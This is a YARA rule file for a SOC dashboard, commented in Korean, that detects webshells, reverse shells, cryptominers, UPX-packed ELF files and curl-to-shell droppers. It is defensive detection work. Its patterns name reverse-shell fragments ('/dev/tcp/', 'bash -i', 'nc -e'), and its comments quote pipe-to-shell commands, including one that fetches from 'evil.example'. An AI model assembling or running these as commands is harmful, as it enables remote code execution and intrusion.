/*
 * SOC 대시보드 기본 YARA 룰
 *
 * 해시 대조(hash_checker)는 '알려진 그 파일'만 잡는다 — 한 바이트만 바뀌어도
 * 놓친다. YARA 는 내용 패턴으로 잡으므로 변종에 강하다. 둘은 대체가 아니라 보완이다.
 *
 * meta.mitre 는 커버리지 자가 진단(modules/coverage.py)이 읽는다.
 * 각 룰의 정탐/오탐 샘플은 data/yara/rule_tests.yml 에 있고 CI 가 검증한다.
 */

rule SOC_EICAR_Test_File
{
    meta:
        description = "EICAR 표준 안티바이러스 테스트 문자열 (악성 아님, 배선 검증용)"
        author = "SOC Dashboard"
        severity = "LOW"
        mitre = "T1204"
    strings:
        $eicar = "EICAR-STANDARD-ANTIVIRUS-TEST-FILE"
    condition:
        $eicar
}

rule SOC_PHP_Webshell
{
    meta:
        description = "PHP 웹셸 — 사용자 입력을 그대로 실행하는 패턴"
        author = "SOC Dashboard"
        severity = "CRITICAL"
        mitre = "T1505"
    strings:
        $php  = "<?php"
        $exec1 = "eval("  nocase
        $exec2 = "system(" nocase
        $exec3 = "passthru(" nocase
        $exec4 = "shell_exec(" nocase
        $input1 = "$_POST"
        $input2 = "$_GET"
        $input3 = "$_REQUEST"
    condition:
        $php and any of ($exec*) and any of ($input*)
}

rule SOC_Reverse_Shell_Script
{
    meta:
        description = "스크립트 형태의 리버스 셸 (bash /dev/tcp · python socket)"
        author = "SOC Dashboard"
        severity = "CRITICAL"
        mitre = "T1059"
    strings:
        $bash_tcp   = "/dev/tcp/"
        $bash_i     = "bash -i"
        $py_sock    = "socket.socket("
        $py_dup     = "os.dup2("
        $py_shell   = "pty.spawn("
        $nc_e       = "nc -e "
    condition:
        ($bash_tcp and $bash_i) or ($py_sock and $py_dup and $py_shell) or $nc_e
}

rule SOC_Cryptominer_Artifact
{
    meta:
        description = "크립토마이너 바이너리·설정 — 채굴 풀 접속 문자열"
        author = "SOC Dashboard"
        severity = "HIGH"
        mitre = "T1496"
    strings:
        $pool1 = "stratum+tcp://"
        $pool2 = "stratum+ssl://"
        $pool3 = "minexmr"
        $pool4 = "supportxmr"
        $bin1  = "xmrig"
        $bin2  = "cpuminer"
    condition:
        any of ($pool*) or any of ($bin*)
}

rule SOC_UPX_Packed_ELF
{
    meta:
        description = "UPX 로 패킹된 ELF — 리눅스 악성코드가 흔히 쓰는 난독화"
        author = "SOC Dashboard"
        severity = "MEDIUM"
        mitre = "T1027"
        // 자동 스캔에서는 제외한다(scope=manual).
        //
        // **UPX 패킹 자체는 악성이 아니다.** 정상 소프트웨어도 쓰고, 무엇보다
        // 패커 도구(/usr/bin/upx-ucl)가 자기 시그니처를 담고 있어 CI 에서
        // 걸렸다. 패킹된 파일과 패커를 내용만으로 구분하려면 UPX 트레일러
        // magic 의 위치를 봐야 하는데, 검증할 실제 패킹 샘플이 없어 추측으로
        // 룰을 조이지 않았다.
        //
        // 패킹은 **탐지가 아니라 정황**이다. 분석가가 특정 파일을 지목해
        // 들여다볼 때(수동 스캔)는 유용하고, 시스템 전체를 훑는 자동 스캔에서는
        // 소음이다. 그 구분을 여기 적는다.
        scope = "manual"
    strings:
        $upx1 = "UPX!"
        $upx2 = "$Info: This file is packed with the UPX"
    condition:
        uint32(0) == 0x464C457F and any of ($upx*)
}

rule SOC_Curl_Pipe_Shell_Dropper
{
    meta:
        description = "원격 스크립트를 받아 바로 실행하는 드로퍼"
        author = "SOC Dashboard"
        severity = "HIGH"
        mitre = "T1105"
        // 오탐을 두 번 줄였다. 둘 다 실측에서 나왔다.
        //
        // 1) 처음에는 "curl " 과 "| sh" 를 각각 찾아 AND 로 묶었다. /usr/bin 743개를
        //    스캔하니 ctest·tailscale 이 걸렸다 — 바이너리 안에 두 문자열이 서로
        //    멀리 떨어져 있었을 뿐이다. 실제 드로퍼는 **한 명령줄 안에서** 파이프가
        //    이어지므로 근접성을 조건에 넣었다.
        // 2) 그래도 CI 러너의 GNU parallel 이 걸렸다. 자기 설치 안내문에
        //    "wget -O - pi.dk/3 | bash" 가 들어 있다 — 문서에 적힌 명령과 실행되는
        //    명령을 YARA 가 구분할 수는 없다. 대신 **스킴이 있는 전체 URL**을
        //    요구했다. 실제 드로퍼는 http(s):// 를 쓰고, 문서의 축약형은 빠진다.
        //
        // 알려진 한계: `curl evil.example/x | sh` 처럼 스킴 없이 쓰는 드로퍼는
        // 놓친다. 자동 스캔이 시스템 전체를 훑는 이상 오탐을 줄이는 쪽을 택했다
        // — 늑대소년이 되면 사람이 알림을 안 본다.
    strings:
        $dropper = /(curl|wget)[^\n\r]{0,200}https?:\/\/[^\n\r]{0,200}\|\s{0,4}(sudo\s+|env\s+)?(ba|z|k|da)?sh\b/
    condition:
        $dropper
}
